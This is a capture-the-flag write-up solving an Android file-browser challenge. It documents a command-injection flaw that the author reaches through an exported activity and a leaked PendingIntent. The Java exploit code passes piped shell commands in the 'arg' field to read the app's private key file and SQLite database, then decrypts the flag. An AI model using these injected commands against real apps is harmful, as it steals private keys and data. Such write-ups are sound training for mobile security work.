# Solution

## Description of the problem

A GDPR-compliant file browser.

## Solution

1. Analyzing the code.

```
  public String getFlag() throws Exception {
        byte[] aesKey = getAesKey(this);
        String encOper = bin2hex(encrypt("genflag".getBytes(), aesKey));
        Uri infoEntries = Uri.parse("content://com.mobisec.provider.Log/log");
        Cursor c = getContentResolver().query(infoEntries, null, null, null, "oper");
        if (c.moveToFirst()) {
            do {
                c.getString(c.getColumnIndex("id"));
                String oper = c.getString(c.getColumnIndex("oper"));
                String arg = c.getString(c.getColumnIndex("arg"));
                if (oper.equals(encOper)) {
                    return new String(decrypt(hex2bin(arg), aesKey));
                }
            } while (c.moveToNext());
            return null;
        }
        return null;
    }
```

From this ```getFlag``` function, we know that the flag is hidden in a table ```log``` in ```com.mobisec.provider.Log``` database, and it is in the first one row in the table. The flag is in the ```arg``` column and it is stored as hex and encrypted. To futher using the provider, I use the related permission:

```
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
```

And then we can see the calling order here is: ```MainActivity -> QueryActivity```. In ```QueryActivity```, I can use operations ```ls```, ```du```, and ```cat```. The other operations will be rejected. And ```cat``` is not available, since the output will only be ```"cat has been momentarily disabled for security reasons"```. But good part is that the code only check the ```oper```, but not the ```arg```, which will be used for me to do the commandline escape. I only need to add ```|```, then I can continue my own command. And then all the output will be written in log ```/sdcard/browser.log```.

```
String[] cmd = {"sh", "-c", "ls " + arg};
p = Runtime.getRuntime().exec(cmd);
```

When I tried to call ```QueryActivity```, I read the Manifest. Only ```PluginActivity``` is accessable, if I have permission ```"com.mobisec.filebrowser.permission.PLUGIN"```, but ```QueryActivity``` is not. Luckily, ```PluginActivity``` can call ```QueryActivity```, and pass the parameters. After add the use-permission of ```"com.mobisec.filebrowser.permission.PLUGIN"```. Then the chain is ```MainActivity -> PluginActivity -> QueryActivity -> Log database```.

```
        <activity android:name="com.mobisec.filebrowser.QueryActivity" android:exported="false"/>
        <activity android:name="com.mobisec.filebrowser.AboutActivity" android:exported="false"/>
        <activity android:name="com.mobisec.filebrowser.PluginActivity" android:permission="com.mobisec.filebrowser.permission.PLUGIN">
```

2. After Analysis, we know the chain is ```MainActivity -> PluginActivity -> QueryActivity -> Log database```, and I need to get the key before going to log database. Here is my code to achieve this.

```
try {

            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.mobisec.filebrowser", "com.mobisec.filebrowser.PluginActivity"));
            startActivityForResult(intent, 0);
            Log.e(TAG, "call filebrowser");
        } catch (Exception e){
            Log.e(TAG, String.valueOf(e));
        }
```
Start tne ```com.mobisec.filebrowser.PluginActivity```, and wait for result. Define ```public void onActivityResult(int requestCode, int resultCode, Intent data)``` to get the result.

Since the ```QueryActivity``` will be sent as a ```Pending Intent```, I received it by:

```
Bundle bundle = data.getExtras();
final PendingIntent pendingIntent = (PendingIntent) bundle.get("pi");
```

Then I start using it to get the flag first. I print the key in shared preference, and then I can read the result in the log ```/sdcard/browser.log```. I extract the key by ```storedKey[0] = content.split(">")[1].split("<")[0];```, and use it later.
```
    final Intent vulnIntent = new Intent();
    vulnIntent.putExtra("debug", true);
    vulnIntent.putExtra("oper", "ls");
    vulnIntent.putExtra("arg", ". | sed -n 3p /data/data/com.mobisec.filebrowser/shared_prefs/keys.xml");

    try{
        pendingIntent.send(this, 0, vulnIntent, null, null);
        final Handler handler = new Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                String content = readFileToString("/sdcard/browser.log");
                storedKey[0] = content.split(">")[1].split("<")[0];
                Log.e(TAG, storedKey[0]);
            }

            private String readFileToString(String filePath) {
                try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {
                    StringBuilder content = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {

                        content.append(line).append("\n");
                    }
                    return content.toString();
                } catch (IOException e) {
                    e.printStackTrace();
                    // Handle exceptions appropriately
                    return null;
                }
            }
            }, 2000);

        } catch (PendingIntent.CanceledException e) {
        Log.e(TAG, String.valueOf(e));
    }
```

After getting the key, I just need to get the flagfrom the first row in Log database inn ```arg``` conlumn, then decode it to binary and decrypt it with my key.

```
final Intent vulnIntent1 = new Intent();
vulnIntent1.putExtra("debug", true);
vulnIntent1.putExtra("oper", "ls");
vulnIntent1.putExtra("arg", ". | sqlite3 /data/data/com.mobisec.filebrowser/databases/LogDb \"select arg from log where id=1;\" > /sdcard/db");
```
I print the key to ```/sdcard/db```.

```
    pendingIntent.send(this, 0, vulnIntent1, null, null);
    final Handler handler = new Handler();
    handler.postDelayed(() -> {
        String content = readFileToString("/sdcard/db");
        String cipher = content;
        Log.e(TAG, cipher);
        try {
            try {
                byte[] enkey = hexToBin(cipher);
                String flag = new String(decrypt(enkey, getAesKey(storedKey[0])));
                Log.e(TAG, flag);
            } catch (Exception e) {
                Log.e(TAG, String.valueOf(e));
                Log.e(TAG, Arrays.toString(e.getStackTrace()));
                throw new RuntimeException(e);
            }

```

Decode it to binary and decrypt it with the key.

I finally get the flag.

## Optional Feedback

So so so so difficult.
